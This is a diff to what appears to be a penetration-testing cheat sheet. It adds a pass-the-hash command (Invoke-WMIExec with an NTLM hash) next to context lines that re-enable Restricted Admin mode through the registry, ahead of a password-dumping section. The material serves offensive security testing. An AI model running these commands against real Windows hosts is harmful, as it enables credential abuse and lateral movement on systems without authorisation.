@@ -271,6 +271,10 @@ If disabled:
 `Enter-PSSession -Computer <Target>`
 `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
 
+## Invoke the hash 
+
+`Invoke-WMIExec -Target blah -Username blah -Hash NTLMHASH -Command blah`
+
 ## Password dumping
 
 ### From Live Kali on a workstation
